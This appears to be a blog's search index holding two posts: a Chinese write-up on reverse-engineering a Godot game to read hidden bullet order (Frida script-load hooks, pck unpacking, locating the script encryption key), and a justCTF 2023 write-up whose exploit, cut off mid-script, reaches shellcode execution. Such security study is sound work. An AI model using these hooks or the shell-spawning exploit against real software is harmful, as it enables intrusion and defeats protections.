<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>godot 引擎逆向初探</title>
      <link href="/2024/01/23/godot-%E5%BC%95%E6%93%8E%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/"/>
      <url>/2024/01/23/godot-%E5%BC%95%E6%93%8E%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>这两天刷 b 站直播，常看的几个恐游主播都在玩一款叫做 <strong>Buckshot Roulette</strong> 的游戏。</p><p><img src="/img/article/20240123/1.jpg" alt="screenshot"></p><p>该游戏说白了就是带点策略的俄罗斯轮盘赌，自己玩了几局确实上头，无尽模式打了 50 多万分还是顶不住道具刷的太烂，寄了。气愤之余，我就在想能不能在有需要的时候能透视枪管里的子弹顺序，这样就可以熬过一些倒霉的对局，于是就有了这篇文章。</p><p>游戏可以在 <a href="https://mikeklubnika.itch.io/buckshot-roulette">itch</a> 上购买和下载，毕竟没有免费，我也不好直接提供下载链接，只需要 1 刀，咱还是支持一下吧。</p><h2 id="引擎识别"><a href="#引擎识别" class="headerlink" title="引擎识别"></a>引擎识别</h2><p>游戏下载下来是一个 300 多 MB 的 exe，没有其他任何资源文件：</p><p><img src="/img/article/20240123/2.png" alt="file properties"></p><p>直接放 IDA 里查看字符串，可以找到一些有意思的路径：</p><p><img src="/img/article/20240123/3.png" alt="IDA Strings"></p><p>在 010 Editor 里也可以看到一个名为 <strong>pck</strong> 的很大的段：</p><p><img src="/img/article/20240123/4.png" alt="010 Editor"></p><p>那基本就可以判断这东西是 godot 引擎打包出来的了。如果你有用 godot 开发过游戏，你会发现在导出成 exe 的时候它会把静态资源还有脚本啥的统统打包成一个后缀为 <code>.pck</code> 的文件，放在 exe 的同级目录。你还可以勾选<strong>嵌入式打包</strong>的选项，它会把 pck 文件放到 exe 里，就像我们讨论的这个游戏一样。</p><h2 id="解包"><a href="#解包" class="headerlink" title="解包"></a>解包</h2><p>翻了翻 github，找到一个好用的工具 <a href="https://github.com/bruvzg/gdsdecomp">gdsdecomp</a>，搞笑的是这软件也是用 godot 做的（</p><p>在 Release 里把工具下下来，运行 gdre_tools.exe，选择 RE Tools -&gt; Recover project：</p><p><img src="/img/article/20240123/5.png" alt="gdre_tools"></p><p>路径就选择 exe 所在的路径：</p><p><img src="/img/article/20240123/6.png" alt="gdre_tools"></p><p>点 Open 后，会弹一个 pck 文件的预览窗口，模式就选 <code>Full Recovery</code>，再选一个解压的目录解压即可：</p><p><img src="/img/article/20240123/7.png" alt="gdre_tools"></p><p>等待一段时间就得到 godot 的工程文件夹，一般导入 godot 编辑器里小修一下都可以直接用了（</p><p><img src="/img/article/20240123/8.png" alt="gdre_tools"></p><h2 id="脚本修改"><a href="#脚本修改" class="headerlink" title="脚本修改"></a>脚本修改</h2><p>脚本都在 <strong>scripts</strong> 目录下，后缀都是 <code>.gd</code>：</p><p><img src="/img/article/20240123/9.png" alt="script analysis"></p><p>用文本编辑器直接打开确实是可读的代码，风格比较像 Python：</p><p><img src="/img/article/20240123/10.png" alt="script analysis"></p><p>查了一下才知道这是 godot 自己实现的一种脚本语言，叫 <a href="https://docs.godotengine.org/zh-cn/4.x/tutorials/scripting/gdscript/gdscript_basics.html">GDScript</a>，看下语法示例就能读懂这些代码了。经过一段时间的分析，在 <code>ShellSpawner.gd</code> 里找到了记录子弹顺序的数组 <strong>sequenceArray</strong>：</p><p><img src="/img/article/20240123/11.png" alt="script analysis"></p><p>这是一个字符串数组，实弹用 “live” 表示，空弹用 “blank” 表示，如果这个数组内容是 <code>[&quot;blank&quot;, &quot;live&quot;, &quot;blank&quot;]</code>，那么接下来几枪就是 <code>空实空 </code>。</p><p>那么问题转变为如何将这个数组 dump 出来。第一步肯定是要改代码的，简单起见，我选择在拿起枪的时候将数组内容 dump 到本地文件。要实现这个效果，需要修改 <code>InteractionManager.gd</code> 的 <em>InteractWith</em> 函数，当交互对象是枪时，调用新增的 <em>DumpBullets</em> 函数：</p><p><img src="/img/article/20240123/12.png" alt="script analysis"></p><p>godot 的持久化存储需要用到 <a href="https://docs.godotengine.org/zh-cn/4.x/classes/class_fileaccess.html">FileAccess 类</a>，并遵循 godot 的<a href="https://docs.godotengine.org/zh-cn/4.x/tutorials/io/data_paths.html#doc-data-paths">文件系统约束</a>，这里的 <code>user://dump.txt</code> 实际对应到系统的 <code>%APPDATA%\Godot\app_userdata\Buckshot Roulette\dump.txt</code> 路径。</p><h2 id="应用修改"><a href="#应用修改" class="headerlink" title="应用修改"></a>应用修改</h2><p>第二步就该使得修改后的脚本生效，有两种方案可以达到这个目的：</p><ol><li>重打包成 pck 文件，然后替换 exe 的 pck 段</li><li>hook 引擎中加载脚本的函数，动态替换脚本内容</li></ol><p>对于第一种方案，刚才用的 <strong>gdsdecomp</strong> 是支持将文件夹打包成 pck 并替换的：</p><p><img src="/img/article/20240123/13.png" alt="apply changes"></p><p><img src="/img/article/20240123/14.png" alt="apply changes"></p><p>这个太简单了，那我们肯定是要捣鼓第二种方案的，<del>不然文章就太水了</del>。</p><p>不得不说，开源的东西就是好，在代码仓库里分析后定位到 <a href="https://github.com/godotengine/godot/blob/master/modules/gdscript/gdscript.cpp">gdscript.cpp</a>，找到 <em>GDScript::load_source_code</em> 函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Error <span class="title">GDScript::load_source_code</span><span class="params">(<span class="keyword">const</span> String &amp;p_path)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (p_path.<span class="built_in">is_empty</span>() || p_path.<span class="built_in">begins_with</span>(<span class="string">&quot;gdscript://&quot;</span>) || ResourceLoader::<span class="built_in">get_resource_type</span>(p_path.<span class="built_in">get_slice</span>(<span class="string">&quot;::&quot;</span>, <span class="number">0</span>)) == <span class="string">&quot;PackedScene&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Vector&lt;<span class="keyword">uint8_t</span>&gt; sourcef;</span><br><span class="line">Error err;</span><br><span class="line">Ref&lt;FileAccess&gt; f = FileAccess::<span class="built_in">open</span>(p_path, FileAccess::READ, &amp;err);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *err_name;</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span> || err &gt;= ERR_MAX) &#123;</span><br><span class="line">err_name = <span class="string">&quot;(invalid error code)&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">err_name = error_names[err];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">ERR_FAIL_COND_V_MSG</span>(err, err, <span class="string">&quot;Attempt to open script &#x27;&quot;</span> + p_path + <span class="string">&quot;&#x27; resulted in error &#x27;&quot;</span> + err_name + <span class="string">&quot;&#x27;.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> len = f-&gt;<span class="built_in">get_length</span>();</span><br><span class="line">sourcef.<span class="built_in">resize</span>(len + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">uint8_t</span> *w = sourcef.<span class="built_in">ptrw</span>();</span><br><span class="line"><span class="keyword">uint64_t</span> r = f-&gt;<span class="built_in">get_buffer</span>(w, len);</span><br><span class="line"><span class="built_in">ERR_FAIL_COND_V</span>(r != len, ERR_CANT_OPEN);</span><br><span class="line">w[len] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">String s;</span><br><span class="line"><span class="keyword">if</span> (s.<span class="built_in">parse_utf8</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)w) != OK) &#123;</span><br><span class="line"><span class="built_in">ERR_FAIL_V_MSG</span>(ERR_INVALID_DATA, <span class="string">&quot;Script &#x27;&quot;</span> + p_path + <span class="string">&quot;&#x27; contains invalid unicode (UTF-8), so it was not loaded. Please ensure that scripts are saved in valid UTF-8 unicode.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">source = s;</span><br><span class="line">path = p_path;</span><br><span class="line">path_valid = <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> TOOLS_ENABLED</span></span><br><span class="line">source_changed_cache = <span class="literal">true</span>;</span><br><span class="line"><span class="built_in">set_edited</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="built_in">set_last_modified_time</span>(FileAccess::<span class="built_in">get_modified_time</span>(path));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// TOOLS_ENABLED</span></span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先把参数 <strong>p_path</strong> 打印出来看看。为了方便，我直接用 frida 来 hook 了：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readString</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> buf = addr.readPointer();</span><br><span class="line">    <span class="keyword">var</span> length = buf.sub(<span class="number">4</span>).readU32() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> idx = <span class="number">0</span>; idx &lt; length; idx++) &#123;</span><br><span class="line">        <span class="keyword">var</span> ascii = buf.add(idx * <span class="number">4</span>).readU8(ascii);</span><br><span class="line">        result += <span class="built_in">String</span>.fromCharCode(ascii);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> base = Module.findBaseAddress(<span class="string">&quot;buckshot roulette.exe&quot;</span>);</span><br><span class="line">    Interceptor.attach(base.add(<span class="number">0x184C90</span>), &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> scriptName = readString(<span class="built_in">this</span>.context.rdx);</span><br><span class="line">            <span class="built_in">console</span>.log(scriptName);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span>(<span class="params">retval</span>) </span>&#123;&#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></figure><p>得到如下结果（部分已省略）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">res://scripts/MenuManager.gd</span><br><span class="line">res://scripts/SaveFileManager.gd</span><br><span class="line">res://scripts/CursorManager.gd</span><br><span class="line">res://scripts/ButtonClass.gd</span><br><span class="line">res://scripts/OptionsManager.gd</span><br><span class="line">res://scripts/RoundManager.gd</span><br><span class="line">res://scripts/PlayerData.gd</span><br></pre></td></tr></table></figure><p>改动比较少的一种方式是直接把这个 <strong>p_path</strong> 改成自定义的路径，这样就不需要费劲去绕 <em>load_source_code</em> 函数的第 19 到 22 行了。先把修改后的 <code>InteractionManager.gd</code> 放到 <code>%APPDATA%\Godot\app_userdata\Buckshot Roulette</code> 目录去，再将 <strong>p_path</strong> 指向 <code>user://InteractionManager.gd</code> 即可，上代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readString</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> buf = addr.readPointer();</span><br><span class="line">    <span class="keyword">var</span> length = buf.sub(<span class="number">4</span>).readU32() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> idx = <span class="number">0</span>; idx &lt; length; idx++) &#123;</span><br><span class="line">        <span class="keyword">var</span> ascii = buf.add(idx * <span class="number">4</span>).readU8(ascii);</span><br><span class="line">        result += <span class="built_in">String</span>.fromCharCode(ascii);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">patchString</span>(<span class="params">addr, str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> buf = addr.readPointer();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> idx = <span class="number">0</span>; idx &lt; str.length; idx++) &#123;</span><br><span class="line">        <span class="keyword">var</span> ascii = str.charCodeAt(idx);</span><br><span class="line">        buf.add(idx * <span class="number">4</span>).writeU8(ascii);</span><br><span class="line">    &#125;</span><br><span class="line">    buf.add(str.length * <span class="number">4</span>).writeU32(<span class="number">0</span>);</span><br><span class="line">    buf.sub(<span class="number">4</span>).writeU32(str.length + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> base = Module.findBaseAddress(<span class="string">&quot;buckshot roulette.exe&quot;</span>);</span><br><span class="line">    Interceptor.attach(base.add(<span class="number">0x184C90</span>), &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> scriptName = readString(<span class="built_in">this</span>.context.rdx);</span><br><span class="line">            <span class="keyword">if</span> (scriptName == <span class="string">&quot;res://scripts/InteractionManager.gd&quot;</span>) &#123;</span><br><span class="line">                patchString(<span class="built_in">this</span>.context.rdx, <span class="string">&quot;user://InteractionManager.gd&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span>(<span class="params">retval</span>) </span>&#123;&#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></figure><p>这个时候游戏可以正常启动，但是点 Start 开始游戏后报错了：</p><p><img src="/img/article/20240123/15.png" alt="apply changes"></p><p>读了下 <a href="https://github.com/godotengine/godot/blob/master/core/io/resource_format_binary.cpp">resource_format_binary.cpp</a> 的相关代码后，发现大概意思是 <code>res://scripts/InteractionManager.gd</code> 这个资源是空的，再回头看下 <em>load_source_code</em> 函数，发现第 32 行还用了 <strong>p_path</strong>，将它赋值给一个成员变量 <strong>path</strong>，那还是在 32 行执行前把 <strong>p_path</strong> 改回 <code>res://scripts/InteractionManager.gd</code> 好了：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> base = Module.findBaseAddress(<span class="string">&quot;buckshot roulette.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Interceptor.attach(base.add(<span class="number">0x184D79</span>), &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> scriptName = readString(<span class="built_in">this</span>.context.r13);</span><br><span class="line">            <span class="keyword">if</span> (scriptName == <span class="string">&quot;res://scripts/InteractionManager.gd&quot;</span>) &#123;</span><br><span class="line">                patchString(<span class="built_in">this</span>.context.r13, <span class="string">&quot;user://InteractionManager.gd&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span>(<span class="params">retval</span>) </span>&#123;&#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    Interceptor.attach(base.add(<span class="number">0x184DFC</span>), &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> scriptName = readString(<span class="built_in">this</span>.context.r13);</span><br><span class="line">            <span class="keyword">if</span> (scriptName == <span class="string">&quot;user://InteractionManager.gd&quot;</span>) &#123;</span><br><span class="line">                patchString(<span class="built_in">this</span>.context.r13, <span class="string">&quot;res://scripts/InteractionManager.gd&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span>(<span class="params">retval</span>) </span>&#123;&#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在完全没问题了，在游戏里拿起枪 <code>%APPDATA%\Godot\app_userdata\Buckshot Roulette</code> 目录下也如愿地出现了 <code>dump.txt</code>：</p><p><img src="/img/article/20240123/16.png" alt="apply changes"></p><h2 id="关于加密"><a href="#关于加密" class="headerlink" title="关于加密"></a>关于加密</h2><p>其实 godot 打包的时候其实还可以对脚本和一些元数据进行预编译和加密，<a href="https://docs.godotengine.org/zh-cn/4.x/contributing/development/compiling/compiling_with_script_encryption_key.html">参考文档</a>：</p><p><img src="/img/article/20240123/17.png" alt="encryption"></p><p>预编译后 <code>scripts</code> 目录下的文件都会以 <code>.gdc</code> 作为文件后缀，如果进一步加密，则以 <code>.gde</code> 结尾。只是预编译并且没有对 GDScript 的解释器实现进行修改，那么用 <strong>gdsdecomp</strong> 还是可以直接反编译的：</p><p><img src="/img/article/20240123/18.png" alt="encryption"></p><p><code>gde</code> 也可以反编译，但是需要先设置密钥：</p><p><img src="/img/article/20240123/19.png" alt="encryption"></p><p>那么密钥怎么找呢，首先要明确一点，密钥肯定在导出的二进制文件里，因为程序要运行起来就必定要动态解密 pck 的内容。至于放在哪里了，还得读源码。<a href="https://github.com/godotengine/godot/blob/master/core/io/file_access_pack.cpp">file_access_pack.cpp</a> 这个文件基本告诉了你引擎是怎么解析 pck 文件的。我们注意到，在 <em>FileAccessPack</em> 类的构造函数中用到了一个全局变量 <strong>script_encryption_key</strong>，这个数组的内容是由 SCons 构建导出模板时根据环境变量 <code>SCRIPT_AES256_ENCRYPTION_KEY</code> 指定的，<a href="https://github.com/godotengine/godot/blob/74c32faa78b54863f8f25c538083907c2bf71791/core/SCsub#L39">代码参考</a>。</p><p>所以要找到密钥就简单了，只需要根据字符串交叉引用先定位到 <em>FileAccessPack</em> 的构造函数，再在其中找到一个长度为 32 的全局变量数组即可。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> Game </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>justCTF 2023</title>
      <link href="/2023/06/07/justCTF-2023/"/>
      <url>/2023/06/07/justCTF-2023/</url>
      
        <content type="html"><![CDATA[<p>Still a nice game. Fortunately, we won the first place this time. And my teammates are all gods, so I didn’t have the chance to do the reverse challenges orz. During this game, I solved one Pwn, one Crypto, and one Web challenge. Some of them are very technical, you need to think of some tricks to bypass the restrictions.</p><p>You can get the attachments <a href="https://in1t.top/attachment/justctf2023/task.zip">here</a>.</p><h2 id="Tic-Tac-PWN"><a href="#Tic-Tac-PWN" class="headerlink" title="Tic Tac PWN!"></a>Tic Tac PWN!</h2><blockquote><p>Description: Let’s pretend I just learned about this cool thing called RPC and wrote a simple example! Is it secure?<br>Author: ptrtofuture<br>Category: PWN<br>Points: 435<br>Solves: 4</p></blockquote><p>The server receives one line of input each time, in the format:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lib_name:func_name arg1 arg2 arg3 arg4 arg5 arg6</span><br></pre></td></tr></table></figure><p>After parsing, use <code>dlsym</code> to find the corresponding function to call:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Open the lib.</span></span><br><span class="line"><span class="built_in">sprintf</span>(lib_name, <span class="string">&quot;rpc_%s.so&quot;</span>, lib_and_symbol);</span><br><span class="line">lib = dlopen(lib_name, RTLD_LAZY);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if the symbol is valid.</span></span><br><span class="line"><span class="keyword">func_t</span> func = (<span class="keyword">func_t</span>) dlsym(lib, sep + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> ((sep + <span class="number">1</span>)[<span class="number">0</span>] == <span class="string">&#x27;_&#x27;</span> || func == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;symbol not found: %s\\n&quot;</span>, sep + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Call the function.</span></span><br><span class="line">func(arg1, arg2, arg3, arg4, arg5, arg6, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>The input library name must be concatenated with <code>rpc_</code>, so it is hard to load arbitrary libraries. Coincidentally, the attachment <code>rpc_tictactoe.so</code> imports libc. So we can get any libc function pointer through <code>dlsym</code>.</p><p>Before thinking about what libc functions to use, we must find out how to bypass the annoying <code>security_check</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">security_check</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    FILE* f = fopen(<span class="string">&quot;/proc/self/maps&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (f == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> from, to;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">while</span> (fgets(buf, <span class="keyword">sizeof</span>(buf), f)) &#123;</span><br><span class="line">        <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%llx-%llx&quot;</span>, &amp;from, &amp;to);</span><br><span class="line">        <span class="keyword">if</span> (from &lt; <span class="number">0x100000000</span>LLu || to &lt; <span class="number">0x100000000</span>LLu) &#123;</span><br><span class="line">            fclose(f);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    fclose(f);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This function will be called before each rpc-call. It checks whether a piece of memory in the low address area has been mmaped. If any errors are found, kill the process through <code>exit</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!security_check()) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;security error!\\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Meanwhile, parameters 1-6 are defined in the main function as follows:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> arg1, arg2, arg3, arg4, arg5, arg6;</span><br></pre></td></tr></table></figure><p>Therefore, if we want to call <code>mmap</code> and specify the address (the program will not tell the client the return value of each rpc-call), it will definitely fail the next <code>security_check</code>, which will cause the program to exit. But it can be used with <code>on_exit</code> (in libc) to jump to the mapped memory before the program actually exits.</p><p>So the exploit should end with:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">on_exit(<span class="number">0x10000</span>);</span><br><span class="line">mmap(<span class="number">0x10000</span>, <span class="number">4096</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>The file corresponding to file handle <code>3</code> should contain shellcode.</p><p>The problem turns into how to open a file with shellcode or how to open a file (with write permission) and write shellcode.</p><p>The answer is to use <code>tmpfile</code> to create an RW temporary file, and then use <code>splice</code> to copy the content of the standard input to the file.</p><p>In this way, arbitrary code execution can be achieved with four libc functions in this restricted environment. The EXP is as follows:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">from pwn <span class="keyword">import</span> *</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">context</span><span class="params">(log_level = <span class="string">&quot;debug&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, os = <span class="string">&quot;linux&quot;</span>)</span></span></span><br><span class="line"><span class="function">shellcode </span>= <span class="keyword">asm</span>(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tictac.nc.jctf.pro&quot;</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">def rpc_call(func_name, a1=<span class="number">0</span>, a2=<span class="number">0</span>, a3=<span 